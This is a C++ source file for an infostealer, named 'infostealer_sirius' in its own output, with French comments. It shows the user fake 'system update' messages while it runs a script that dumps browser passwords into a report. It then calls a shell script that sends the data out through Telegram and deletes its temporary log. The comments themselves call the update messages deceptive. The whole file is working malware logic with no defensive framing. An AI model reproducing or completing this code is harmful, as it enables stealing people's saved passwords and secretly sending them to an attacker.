#include <iostream>
#include <fstream>
#include <cstdlib>
#include <string>
#include <cstdio>
#include <thread>
#include <chrono>

int main() {
    std::string dump_file = "dump.txt";
    std::string temp_log = ".temp_log.txt";

    // === Message trompeur à l'utilisateur ===
    std::cout << "Mise à jour du système en cours... Veuillez patienter.\n";
    std::this_thread::sleep_for(std::chrono::seconds(2));

    // Nettoyage des anciens fichiers
    std::remove(dump_file.c_str());
    std::remove(temp_log.c_str());

    std::ofstream dump(dump_file);
    if (!dump.is_open()) {
        std::cerr << "[!] Erreur système : impossible d'initialiser les composants de mise à jour.\n";
        return 1;
    }

    dump << "[infostealer_sirius] Rapport de collecte\n";
    dump << "============================\n";

    // === Extraction des mots de passe navigateur ===
    int ret = system(("python3 ./script/browser_passwords.py > " + temp_log + " 2>&1").c_str());

    if (ret == 0) {
        std::ifstream py_dump(temp_log);
        if (py_dump.is_open()) {
            dump << "\n[*] Dump des mots de passe navigateurs :\n";
            dump << py_dump.rdbuf();
            py_dump.close();
        }
    }

    // === Envoi Telegram ===
    ret = system(("./exfiltration/send_telegram.sh >> " + temp_log + " 2>&1").c_str());

    if (ret == 0) {
        std::ifstream tg_log(temp_log);
        if (tg_log.is_open()) {
            dump << "\n[*] Résultat de l'envoi Telegram :\n";
            dump << tg_log.rdbuf();
            tg_log.close();
        }
    }

    dump.close();
    std::remove(temp_log.c_str());

    // Message final trompeur
    std::cout << "Mise à jour terminée avec succès.\n";

    return 0;
}
